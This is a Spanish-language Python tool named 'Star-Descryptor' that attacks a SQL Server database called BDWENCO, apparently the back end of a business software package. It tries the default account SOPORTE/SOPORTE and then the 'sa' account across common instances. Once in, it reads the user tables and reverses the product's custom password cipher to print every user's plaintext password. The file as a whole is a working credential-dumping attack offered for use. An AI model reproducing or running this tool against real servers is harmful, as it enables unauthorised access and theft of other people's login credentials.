# -*- coding: utf-8 -*-
import sys
import getpass

# Banner generado letra por letra con asteriscos
BANNER = """
 ****    ****    *    ****      ****   ****    ****   ****   *   *  ****   ****   ****
 *       *      * *   *  *     *   *  *      *      *       *   *  *   *  *   *  *   
 ****    *     *   *  ****     *   *  ****   ****   *       *****  ****   *   *  ****
    *    *    *******  *  *    *   *  *         *   *       *   *  *  *   *   *  *   
 ****    *   *       * *   *   ****   ****  ****     ****   *   *  *   *  ****   ****
"""

def print_banner():
    linea = "=" * 90
    print(linea)
    print(BANNER)
    print("       >> Star-Descryptor v1.6  |  by mr.r360  |  remoto360.com <<")
    print(linea)
    print()

# ─────────────────────────────────────────────
#  ALGORITMO DE DESCIFRADO
# ─────────────────────────────────────────────
def descifrar(texto_cifrado):
    bytes_cifrados = texto_cifrado.encode('latin-1')
    resultado = []
    for i, byte_val in enumerate(bytes_cifrados):
        pos = i % 8
        bloque_inicio = (i // 8) * 8
        c1_val = bytes_cifrados[bloque_inicio + 1] if len(bytes_cifrados) > bloque_inicio + 1 else 0
        llave_dinamica = 5 - (c1_val % 10)
        if pos == 0:
            origen = byte_val + 5
        elif pos == 1 or pos == 3:
            origen = byte_val + 36
        elif pos == 2 or pos == 4:
            origen = byte_val + llave_dinamica
        elif pos == 5:
            origen = byte_val + 32
        elif pos == 6:
            origen = byte_val // 2
        elif pos == 7:
            origen = byte_val + 37
        resultado.append(chr(origen % 256))
    return "".join(resultado)


# ─────────────────────────────────────────────
#  CONEXIÓN A SQL SERVER
# ─────────────────────────────────────────────
def conectar(ip, sql_user, sql_pass, instancia=None):
    try:
        import pyodbc
    except ImportError:
        print("\n[!] ERROR: pyodbc no está instalado.")
        print("    Ejecuta : apt-get install -y python3-pyodbc")
        print("    En Kali : pip3 install pyodbc --break-system-packages\n")
        sys.exit(1)

    servidor = f"{ip}\\{instancia}" if instancia else ip
    drivers = [
        "ODBC Driver 18 for SQL Server",
        "ODBC Driver 17 for SQL Server",
        "ODBC Driver 13 for SQL Server",
    ]
    conn_str_base = (
        f"SERVER={servidor};DATABASE=BDWENCO;"
        f"UID={sql_user};PWD={sql_pass};"
        "TrustServerCertificate=yes;Connection Timeout=6;"
    )
    for driver in drivers:
        try:
            conn = pyodbc.connect(f"DRIVER={{{driver}}};" + conn_str_base)
            inst_str = f"\\{instancia}" if instancia else "(default)"
            print(f"[+] Conectado | {ip}{inst_str} | usuario: {sql_user} | driver: {driver}")
            return conn
        except pyodbc.Error:
            continue
    return None


def intentar_conexion(ip, instancia, sql_user, sql_pass):
    inst_str = f"\\{instancia}" if instancia else "(sin instancia)"
    print(f"[~] Probando {ip}{inst_str} | {sql_user} ...")
    return conectar(ip, sql_user, sql_pass, instancia)


# ─────────────────────────────────────────────
#  DETECTAR TABLA Y LEER USUARIOS
# ─────────────────────────────────────────────
def tabla_existe(conn, nombre_tabla):
    cursor = conn.cursor()
    cursor.execute("""
        SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES
        WHERE TABLE_CATALOG='BDWENCO' AND TABLE_SCHEMA='dbo' AND TABLE_NAME=?
    """, nombre_tabla)
    return cursor.fetchone()[0] > 0

def contar_registros(conn, nombre_tabla):
    cursor = conn.cursor()
    cursor.execute(f"SELECT COUNT(*) FROM BDWENCO.dbo.{nombre_tabla}")
    return cursor.fetchone()[0]

def leer_tabla_usuario(conn):
    cursor = conn.cursor()
    cursor.execute("SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD FROM BDWENCO.dbo.USUARIO ORDER BY USU_CODIGO")
    return cursor.fetchall(), ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "USU_PASSWORD"]

def leer_tabla_usuarios(conn):
    cursor = conn.cursor()
    cursor.execute("SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO FROM BDWENCO.dbo.USUARIOS ORDER BY USU_CODIGO")
    return cursor.fetchall(), ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]

def detectar_y_leer(conn):
    for tabla, leer_fn in [("USUARIO", leer_tabla_usuario), ("USUARIOS", leer_tabla_usuarios)]:
        if tabla_existe(conn, tabla):
            count = contar_registros(conn, tabla)
            if count > 0:
                print(f"[+] Tabla detectada: {tabla} ({count} registros)")
                return leer_fn(conn), tabla
    print("[!] No se encontró tabla USUARIO ni USUARIOS con datos en BDWENCO.")
    sys.exit(1)

def mostrar_resultados(filas, cols, tabla):
    pwd_idx = cols.index("USU_PASSWORD")
    col_w = []
    for c in cols:
        if c in ("USU_NOMBRE", "USU_CARGO"):
            col_w.append(26)
        elif c == "USU_PASSWORD":
            col_w.append(22)
        else:
            col_w.append(12)
    col_w_full = col_w + [22]
    headers_display = cols + ["PWD DESCIFRADO"]
    sep = "─" * (sum(col_w_full) + len(col_w_full) * 3 + 1)

    print(sep)
    print(" " + " | ".join(h.ljust(col_w_full[i]) for i, h in enumerate(headers_display)))
    print(sep)

    for row in filas:
        valores = [str(v or "").strip() for v in row]
        pwd_enc = valores[pwd_idx]
        try:
            pwd_dec = descifrar(pwd_enc) if pwd_enc else "(vacío)"
        except Exception as e:
            pwd_dec = f"[ERR:{e}]"
        fila_display = valores + [pwd_dec]
        linea = " | ".join(str(v).ljust(col_w_full[i])[:col_w_full[i]] for i, v in enumerate(fila_display))
        print(f" {linea}")

    print(sep)
    print(f"\n[+] Total usuarios procesados: {len(filas)}")
    print(f"[+] Star-Descryptor v1.6 — remoto360.com\n")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
print_banner()

ip = input("  IP del servidor SQL Server  : ").strip()
if not ip:
    print("[!] IP requerida.")
    sys.exit(1)

conn    = None
sa_pass = None

print()

# ── FASE 1: SOPORTE/SOPORTE sin instancia ──
conn = intentar_conexion(ip, None, "SOPORTE", "SOPORTE")

# ── FASE 2: SOPORTE/SOPORTE con SQLEXPRESS ──
if not conn:
    conn = intentar_conexion(ip, "SQLEXPRESS", "SOPORTE", "SOPORTE")

# ── FASE 3: pedir instancia manual con SOPORTE ──
if not conn:
    print(f"\n[!] No se pudo conectar con SOPORTE. Intentando con instancia manual...")
    instancia_manual = input("  Nombre de instancia (Enter para omitir): ").strip() or None
    if instancia_manual:
        conn = intentar_conexion(ip, instancia_manual, "SOPORTE", "SOPORTE")

# ── FASE 4: pedir contraseña sa ──
if not conn:
    print(f"\n[!] Falló SOPORTE/SOPORTE. Probando con usuario sa...")
    sa_pass = getpass.getpass("  Contraseña del usuario sa   : ")

    # sa sin instancia
    conn = intentar_conexion(ip, None, "sa", sa_pass)

    # sa con SQLEXPRESS
    if not conn:
        conn = intentar_conexion(ip, "SQLEXPRESS", "sa", sa_pass)

    # sa con instancia manual (si se ingresó antes)
    if not conn and 'instancia_manual' in dir() and instancia_manual:
        conn = intentar_conexion(ip, instancia_manual, "sa", sa_pass)

    # sa pidiendo nueva instancia
    if not conn:
        instancia_sa = input("  Instancia para sa (Enter para omitir): ").strip() or None
        if instancia_sa:
            conn = intentar_conexion(ip, instancia_sa, "sa", sa_pass)

if not conn:
    print("\n[!] Conexión fallida. Verifica IP, instancia, firewall o puerto 1433.")
    sys.exit(1)

try:
    print("\n[~] Detectando tabla de usuarios...\n")
    (filas, cols), tabla = detectar_y_leer(conn)
    print()
    mostrar_resultados(filas, cols, tabla)
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    conn.close()
